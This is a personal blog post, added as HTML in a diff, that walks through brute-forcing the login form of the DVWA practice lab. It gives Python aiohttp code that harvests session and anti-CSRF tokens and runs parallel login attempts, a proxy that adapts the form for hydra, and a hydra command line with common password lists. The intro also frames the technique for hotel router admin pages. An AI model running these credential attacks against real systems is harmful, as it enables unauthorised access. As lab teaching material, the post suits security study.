@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Software engeneer" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink" /> 
+
+<title>Alexander Kutsan | Brutforce http on dvwa example</title>
+<meta
+  property="og:title"
+  content="Alexander Kutsan | Brutforce http on dvwa example"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://alexkutsan.github.io/posts/dvwa-brutforce/" />
+<meta property="og:description" content="Some fun with efectiveness of brutforsing http forms" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Brutforce http on dvwa example" />
+<meta name="twitter:description" content="Some fun with efectiveness of brutforsing http forms" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="Alexander Kutsan"
+          href="https://alexkutsan.github.io/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://alexkutsan.github.io/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <div class="avatar">
+			<a href="/">
+                <img alt="Alexander Kutsan" title="Alexander Kutsan" src="https://alexkutsan.github.io/processed_images/avatar.9ecf448463fb0d41.jpg" srcset="https://alexkutsan.github.io/processed_images/avatar.078cb1ab591eee34.jpg 64w, https://alexkutsan.github.io/processed_images/avatar.9ecf448463fb0d41.jpg 128w, https://alexkutsan.github.io/processed_images/avatar.d3efc11b3c52ef68.jpg 256w" class="" />
+
+			</a>
+		</div>
+	    <a class="site-name"
+           href="/">
+            <h1>Alexander Kutsan</h1>
+        </a>
+        <div class="site-description">
+            <p>Software engeneer</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://alexkutsan.github.io/ ">About</a> 
+            <a 
+                href="https://alexkutsan.github.io/posts/ ">Posts</a> 
+            <a 
+                href="https://alexkutsan.github.io/tags/ ">Tags</a> 
+            <a 
+                href="https://photo.alexkutsan.me/ ">Photos</a> 
+            <a 
+                href="https://alexkutsan.github.io/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">20</span>
+        <span class="rest">Jan 24</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Brutforce http on dvwa example </h1>
+    </div>
+  </div>
+    
+  <article><p>Generally, brute-forcing is not an effective method of penetration. However, in many cases, people do not really care about the strong protection of things they do not consider sensitive or important, such as WiFi passwords or router admin page credentials. Additionally, people often use simple passwords for frequently accessed accounts, such as mobile unlock passwords or notebook/PC user passwords.</p>
+<p>In these cases, brute-forcing becomes a realistic approach to gaining access to the system, especially if the system lacks additional protections like rate limits.</p>
+<span id="continue-reading"></span>
+<p>I personally encountered a common situation where cheap hotel WiFi routers perform poorly, even with a limited number of connected clients. This is typically due to their low-quality software, which is not designed to operate for extended periods without rebooting and continuously registering numerous clients. In my experience, simply rebooting the router resolves the issue.</p>
+<p>Usually, passwords on router admin pages are set to default values like &quot;admin/admin&quot; or common standard passwords. In many cases, the admin password is the same as the WiFi hotspot password, while in others, it might be &quot;admin1,&quot; &quot;password,&quot; &quot;1111,&quot; or other frequently used combinations. Although guessing them manually may not be easy, even small password lists usually contain these common combinations.</p>
+<p>I was playing a bit with brute-forcing such forms and want to share some of my experience.
+I'll use the DVWA login page for brute-forcing for several reasons:</p>
+<ul>
+<li>It is rather simple, so we can use HTTP-only communication without involving a browser, Selenium, CDP, etc.</li>
+<li>It contains basic protection (anti-CSRF token) that makes it a bit closer to real-life examples.</li>
+<li>It is easy to spawn with Docker.</li>
+</ul>
+<h2 id="anti-csrf-tocken">Anti-CSRF tocken</h2>
+<p>When you visit the main page of dvwa, the response contains Set-cookie <code>PHPSESSID</code>.
+It is generated uniq and identify you as a client. Futher when you will be autorized, your autorized session session will be identified by this cookie.</p>
+<p>And there is one more token interesting thing that is not listed in headeers. Pay attantion at the login page form:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">form </span><span style="color:#d08770;">action</span><span>=&quot;</span><span style="color:#a3be8c;">login.php</span><span>&quot; </span><span style="color:#d08770;">method</span><span>=&quot;</span><span style="color:#a3be8c;">post</span><span>&quot;&gt;
+</span><span>  &lt;</span><span style="color:#bf616a;">fieldset</span><span>&gt;
+</span><span>    &lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span>=&quot;</span><span style="color:#a3be8c;">user</span><span>&quot;&gt;Username&lt;/</span><span style="color:#bf616a;">label</span><span>&gt; &lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">text</span><span>&quot; </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">loginInput</span><span>&quot; </span><span style="color:#d08770;">size</span><span>=&quot;</span><span style="color:#a3be8c;">20</span><span>&quot; </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">username</span><span>&quot;&gt;&lt;</span><span style="color:#bf616a;">br </span><span>/&gt;
+</span><span>    &lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span>=&quot;</span><span style="color:#a3be8c;">pass</span><span>&quot;&gt;Password&lt;/</span><span style="color:#bf616a;">label</span><span>&gt; &lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">password</span><span>&quot; </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">loginInput</span><span>&quot; </span><span style="color:#d08770;">AUTOCOMPLETE</span><span>=&quot;</span><span style="color:#a3be8c;">off</span><span>&quot; </span><span style="color:#d08770;">size</span><span>=&quot;</span><span style="color:#a3be8c;">20</span><span>&quot; </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">password</span><span>&quot;&gt;&lt;</span><span style="color:#bf616a;">br </span><span>/&gt;
+</span><span>    &lt;</span><span style="color:#bf616a;">br </span><span>/&gt;
+</span><span>    &lt;</span><span style="color:#bf616a;">p </span><span style="color:#d08770;">class</span><span>=&quot;</span><span style="color:#a3be8c;">submit</span><span>&quot;&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">submit</span><span>&quot; </span><span style="color:#d08770;">value</span><span>=&quot;</span><span style="color:#a3be8c;">Login</span><span>&quot; </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">Login</span><span>&quot;&gt;&lt;/</span><span style="color:#bf616a;">p</span><span>&gt;
+</span><span>  &lt;/</span><span style="color:#bf616a;">fieldset</span><span>&gt;
+</span><span>  &lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&#39;</span><span style="color:#a3be8c;">hidden</span><span>&#39; </span><span style="color:#d08770;">name</span><span>=&#39;</span><span style="color:#a3be8c;">user_token</span><span>&#39; </span><span style="color:#d08770;">value</span><span>=&#39;</span><span style="color:#a3be8c;">f2d9e02f055bfb41947082e86df2dbfb</span><span>&#39; /&gt;
+</span><span>&lt;/</span><span style="color:#bf616a;">form</span><span>&gt;
+</span></code></pre>
+<p>There is no visible addition input - <code>hidden</code>, with random value every new time you load the page.
+Server knows what token was dedicated to what paticular PHPSESSID.
+So in case if wrong token will be used , login won't be succesful eve with valid credentials.</p>
+<p>With this protection in place, an attacker who tries to perform CSRF using a malicious site cannot fake HTTP requests without knowing the current token set in the valid user’s cookie  PHPSESSID. Because your server rejects all requests without this token, any attack attempts will fail.
+More info on <a href="https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/">https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/</a>, <a href="https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/">https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/</a></p>
+<p>There fore to start brutforsing, we have to get <code>PHPSESSID</code> and <code>user_token</code>.</p>
+<p>So HTTP get of the login page give use this infor in set-cookies and response body. HTMP parsing is not mandatory - we can d it with regexp.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">async def </span><span style="color:#8fa1b3;">get_phpssid_and_user_token</span><span>(</span><span style="color:#bf616a;">login_page_url</span><span>, </span><span style="color:#bf616a;">session</span><span>):
+</span><span>  </span><span style="color:#b48ead;">async with </span><span>session.</span><span style="color:#bf616a;">get</span><span>(login_page_url, </span><span style="color:#bf616a;">allow_redirects </span><span>= </span><span style="color:#d08770;">False</span><span>) </span><span style="color:#b48ead;">as </span><span>response:
+</span><span>    headers = response.headers
+</span><span>    set_cookie = headers.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">Set-Cookie</span><span>&#39;)
+</span><span>    </span><span style="color:#65737e;"># PHPSESSID=sonlldpq6ikpmqnpq5lh6rbvn6; path=/&#39;
+</span><span>    phpsessid = re.</span><span style="color:#bf616a;">search</span><span>(&quot;</span><span style="color:#a3be8c;">PHPSESSID=(.+?);</span><span>&quot;, set_cookie).</span><span style="color:#bf616a;">group</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>    content = </span><span style="color:#b48ead;">await </span><span>response.</span><span style="color:#bf616a;">text</span><span>()
+</span><span>    </span><span style="color:#65737e;"># &lt;input type=&#39;hidden&#39; name=&#39;user_token&#39; value=&#39;516a2d3820eda4873109988ec5ff167c&#39; /&gt;
+</span><span>    user_token = re.</span><span style="color:#bf616a;">search</span><span>(&quot;</span><span style="color:#a3be8c;">name=&#39;user_token&#39; value=&#39;(.+?)&#39;</span><span>&quot;, content).</span><span style="color:#bf616a;">group</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>    logging.</span><span style="color:#bf616a;">debug</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">get_phpssid_and_user_token done phpsessid: </span><span>{phpsessid}</span><span style="color:#a3be8c;">, user_token: </span><span>{user_token}&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>phpsessid, user_token
+</span></code></pre>
+<p>I am not processing possible error is this examples to make them short.
+In real case it you always sould do it.</p>
+<h2 id="login-function">Login function</h2>
+<p>For brute-forcing, we need a boolean function that returns true if the login was successful and false otherwise. The unsuccessful login signal for DVWA is a redirection to <code>login.php</code>, while a redirection to <code>index.php</code> indicates a successful login.</p>
+<p>Here is a login page with async aiohttp in python.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">async def </span><span style="color:#8fa1b3;">login</span><span>(</span><span style="color:#bf616a;">login_page_url</span><span>, </span><span style="color:#bf616a;">user</span><span>, </span><span style="color:#bf616a;">password</span><span>, </span><span style="color:#bf616a;">user_token</span><span>, </span><span style="color:#bf616a;">phpsessid</span><span>):
+</span><span>  data = {
+</span><span>        &#39;</span><span style="color:#a3be8c;">username</span><span>&#39;: user,
+</span><span>        &#39;</span><span style="color:#a3be8c;">password</span><span>&#39;: password,
+</span><span>        &#39;</span><span style="color:#a3be8c;">Login</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">Login</span><span>&#39;,
+</span><span>        &#39;</span><span style="color:#a3be8c;">user_token</span><span>&#39;: user_token
+</span><span>  }
+</span><span>  </span><span style="color:#b48ead;">async with </span><span>aiohttp.</span><span style="color:#bf616a;">ClientSession</span><span>() </span><span style="color:#b48ead;">as </span><span>session:
+</span><span>    </span><span style="color:#b48ead;">async with </span><span>session.</span><span style="color:#bf616a;">post</span><span>(login_page_url, </span><span style="color:#bf616a;">allow_redirects </span><span>= </span><span style="color:#d08770;">False</span><span>, </span><span style="color:#bf616a;">headers</span><span>=headers, </span><span style="color:#bf616a;">data</span><span>=data) </span><span style="color:#b48ead;">as </span><span>response:
+</span><span>      headers = {
+</span><span>          &#39;</span><span style="color:#a3be8c;">Content-Type</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">application/x-www-form-urlencoded</span><span>&#39;,
+</span><span>          &#39;</span><span style="color:#a3be8c;">Cookie</span><span>&#39;: </span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">PHPSESSID=</span><span>{phpsessid}</span><span style="color:#a3be8c;">; security=low</span><span>&#39;,
+</span><span>      }
+</span><span>      location = headers.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">Location</span><span>&#39;)
+</span><span>      </span><span style="color:#b48ead;">if </span><span>location == &quot;</span><span style="color:#a3be8c;">index.php</span><span>&quot;:
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">True
+</span><span>      </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">False
+</span></code></pre>
+<h2 id="parallel-brutforce">Parallel brutforce</h2>
+<p>Even on localhost sequential HTTP request-response is dramaticaly not efficient. We can do it in parallel with <code>aiohttp</code>.</p>
+<p>All login requests will be started in parallel but not in threads, async approach will allocate exection time for jobs while other jobs are waiting for IO(http response).</p>
+<p>It is required to stop brutforsing when login was succesful, so I can't just post all hjobs and whait fo all of them are done.</p>
+<p>Each job should report about it's in some kind of shared storage the results of its login attempt.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">async def </span><span style="color:#8fa1b3;">attack</span><span>(</span><span style="color:#bf616a;">usernames</span><span>, </span><span style="color:#bf616a;">passwords</span><span>, </span><span style="color:#bf616a;">phpsessid</span><span>, </span><span style="color:#bf616a;">user_token</span><span>):
+</span><span>  queue = asyncio.</span><span style="color:#bf616a;">Queue</span><span>()
+</span><span>  tasks = []
+</span><span>  </span><span style="color:#b48ead;">for </span><span>username </span><span style="color:#b48ead;">in </span><span>usernames:
+</span><span>      </span><span style="color:#b48ead;">for </span><span>password </span><span style="color:#b48ead;">in </span><span>passwords:
+</span><span>        task = asyncio.</span><span style="color:#bf616a;">create_task</span><span>(</span><span style="color:#bf616a;">login_task</span><span>(queue, username, password, user_token, phpsessid))
+</span><span>        tasks.</span><span style="color:#bf616a;">append</span><span>(task)
+</span><span>  logging.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">attack started tasks: </span><span>{</span><span style="color:#96b5b4;">len</span><span>(tasks)}&quot;)
+</span><span>  received_count = </span><span style="color:#d08770;">0
+</span><span>  pbar = tqdm.</span><span style="color:#bf616a;">tqdm</span><span>(</span><span style="color:#bf616a;">total</span><span>=</span><span style="color:#96b5b4;">len</span><span>(tasks))
+</span><span>  </span><span style="color:#b48ead;">while </span><span>received_count &lt; </span><span style="color:#96b5b4;">len</span><span>(tasks):
+</span><span>    res = </span><span style="color:#b48ead;">await </span><span>queue.</span><span style="color:#bf616a;">get</span><span>()
+</span><span>    </span><span style="color:#b48ead;">if </span><span>res[&quot;</span><span style="color:#a3be8c;">login</span><span>&quot;]:
+</span><span>      </span><span style="color:#b48ead;">return </span><span>res
+</span><span>    received_count += </span><span style="color:#d08770;">1
+</span><span>    pbar.</span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>  </span><span style="color:#b48ead;">for </span><span>task </span><span style="color:#b48ead;">in </span><span>tasks:
+</span><span>    task.</span><span style="color:#bf616a;">cancel</span><span>()
+</span></code></pre>
+<p>While the login task is just calling login funtion and put a result in queue.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">async def </span><span style="color:#8fa1b3;">login_task</span><span>(</span><span style="color:#bf616a;">queue</span><span>, </span><span style="color:#bf616a;">login_page_url</span><span>, </span><span style="color:#bf616a;">user</span><span>, </span><span style="color:#bf616a;">password</span><span>, </span><span style="color:#bf616a;">user_token</span><span>, </span><span style="color:#bf616a;">phpsessid</span><span>):
+</span><span>  result = {&quot;</span><span style="color:#a3be8c;">username</span><span>&quot; : user,
+</span><span>            &quot;</span><span style="color:#a3be8c;">password</span><span>&quot; : password,
+</span><span>            &quot;</span><span style="color:#a3be8c;">login</span><span>&quot; : </span><span style="color:#b48ead;">await </span><span style="color:#bf616a;">login</span><span>(login_page_url, user, password, user_token, phpsessid)
+</span><span>            }
+</span><span>  </span><span style="color:#b48ead;">await </span><span>queue.</span><span style="color:#bf616a;">put</span><span>(result)
+</span></code></pre>
+<p>Link to full attack script: </p>
+<h2 id="mature-approach-hydra">Mature approach - hydra</h2>
+<p>Writing own britforsing script gives a lot of flexibility, but it is not easy to make it robust and most efficient. 
+Bunch of problems that you should think about, especially when you is working with big password/usernames list and real targets, but not just localhost. 
+At least:</p>
+<ul>
+<li>Connection reuse to avoid setting up new TCP conneciton every time you perform a request. </li>
+<li>Do not spawn hundred thouthends of async jobs in case of working with big password lists that won't be efficient.</li>
+<li>Work with some paticular parallel requests to avoid target overloading and therefore not stable responses.</li>
+</ul>
+<p>For sure there is ready to use brutforsing util - <a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a></p>
+<p>With a power of nix pakage manager I can get shell wiuth hydra available just like this :</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span> </span><span style="color:#bf616a;">nix-shell -p</span><span> thc-hydra
+</span></code></pre>
+<p>That is why I love NixOS and nix package manager (available even on MacOS even for M1). </p>
+<p>Hydra is very powerful tool, but handling anticsrf tocken and sessionid would not be easy, and require some preliminary preparation (manually get session id and tocken and pass it as parameters to hydra).</p>
+<p>One more thing that hydra is not doing really good - complicsted machers for succesful and unsuccessful login. In dvwa case it it not a response code and not text in body - it is a <code>Location</code> header value.</p>
+<p>To make hydra work with dvwa login, I choose to create some kind like a proxy server that would take user/login parameters on input, perform login and then response with login done in case of succesful login, and login failed in case of unsuccessful login. Such triggers can be natively parsed by <code>http-get-form</code> hydra module. Also this proxy server would handle all session_id and token staff.</p>
+<p><code>get_phpssid_and_user_token</code> funciton is already implemented. Same as <code>dvwa_login</code>.</p>
+<p>Login handler would looks like:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">async def </span><span style="color:#8fa1b3;">login_handler</span><span>(</span><span style="color:#bf616a;">request</span><span>):
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        user = request.query.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">u</span><span>&#39;)
+</span><span>        password = request.query.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">p</span><span>&#39;)
+</span><span>        login_success = </span><span style="color:#b48ead;">await </span><span style="color:#bf616a;">dvwa_login</span><span>(user, password)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>login_success:
+</span><span>            </span><span style="color:#b48ead;">return </span><span>web.</span><span style="color:#bf616a;">Response</span><span>(</span><span style="color:#bf616a;">text</span><span>=&quot;</span><span style="color:#a3be8c;">login done</span><span>&quot;,</span><span style="color:#bf616a;">status</span><span>=</span><span style="color:#d08770;">200</span><span>)
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            </span><span style="color:#b48ead;">return </span><span>web.</span><span style="color:#bf616a;">Response</span><span>(</span><span style="color:#bf616a;">text</span><span>=&quot;</span><span style="color:#a3be8c;">login failed</span><span>&quot;, </span><span style="color:#bf616a;">status</span><span>=</span><span style="color:#d08770;">200</span><span>)
+</span><span>    </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
+</span><span>        </span><span style="color:#b48ead;">return </span><span>web.</span><span style="color:#bf616a;">Response</span><span>(</span><span style="color:#bf616a;">text</span><span>=&quot;</span><span style="color:#a3be8c;">login failed</span><span>&quot;,</span><span style="color:#bf616a;">status</span><span>=</span><span style="color:#d08770;">200</span><span>)
+</span><span>
+</span><span>app = web.</span><span style="color:#bf616a;">Application</span><span>()
+</span><span>app.router.</span><span style="color:#bf616a;">add_route</span><span>(&#39;</span><span style="color:#a3be8c;">*</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">/login</span><span>&#39;, login_handler)
+</span><span>web.</span><span style="color:#bf616a;">run_app</span><span>(app, </span><span style="color:#bf616a;">port</span><span>=</span><span style="color:#d08770;">8080</span><span>)
+</span><span>
+</span></code></pre>
+<p>Anh hydra command run would look like this:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">time</span><span> hydra \
+</span><span style="color:#bf616a;">  -L</span><span> users.txt \
+</span><span style="color:#bf616a;">  -P</span><span> passwords.txt \
+</span><span style="color:#bf616a;">  -s</span><span> 8080 \
+</span><span style="color:#bf616a;">  -t</span><span> 64 \
+</span><span>  localhost \
+</span><span>  http-get-form &quot;</span><span style="color:#a3be8c;">/login:u=^USER^&amp;p=^PASS^:G=:failed</span><span>&quot;
+</span></code></pre>
+<p>Here :</p>
+<ul>
+<li><code>time</code> - for measuring how muych time it takes to attack the target</li>
+<li><code>-L users.txt</code> - specify user list</li>
+<li><code>-P passwords.txt</code> specify passwords list</li>
+<li><code>-s 8080</code> - setup port of the target (in pur case a login proxy server)</li>
+<li><code>-t 64</code> amount of parallels connections (64 is max, that is confusing)</li>
+<li><code>localhost</code> - adress of login proxy server</li>
+<li><code>http-get-form</code> - module to use</li>
+<li><code>&quot;/login:u=^USER^&amp;p=^PASS^:G=:failed&quot;</code> - description of request and parsing th response :
+<ul>
+<li><code>/login</code> - endpoint with <code>u</code> and <code>p</code> query params</li>
+<li><code>^USER</code> - placeholder for username</li>
+<li><code>^PASS</code> - placeholder for password</li>
+<li><code>:G=</code> - <code>:</code> delimeter and setting to skip pre-request for set-cookie colleciton</li>
+<li><code>:failed</code> - failed login body matcher</li>
+</ul>
+</li>
+</ul>
+<h2 id="measure-requests-per-second">Measure requests per second</h2>
+<p>For userss and passwords for example you can use top 100 passwords from https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt </p>
+<p>and user names from https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt</p>
+<p>Hydra reports the number of requests per minut that it is doing.
+As soon as admin is on the second position in the susernames-shoort list it find it to fast. To see the bandwith I have put the admin a bit lower.
+With hydra separate on on machine and dvwa one another accesible with tailscale and 64 threads i have following numbers:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[STATUS] 1216.00 tries/min, 1216 tries in 00:01h, 501 to do in 00:01h, 64 active
+</span></code></pre>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://alexkutsan.github.io/tags/http'>http</a></li>
+    
+      <li><a href='https://alexkutsan.github.io/tags/async'>async</a></li>
+    
+      <li><a href='https://alexkutsan.github.io/tags/python'>python</a></li>
+    
+      <li><a href='https://alexkutsan.github.io/tags/appsec'>appsec</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/alexkutsan"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                
+                
+                
+                <li>
+                    <a href="https://alexkutsan.github.io/atom.xml"
+                       title="Alexander Kutsan"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © Alexander Kutsan 2024
+
+        
+        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
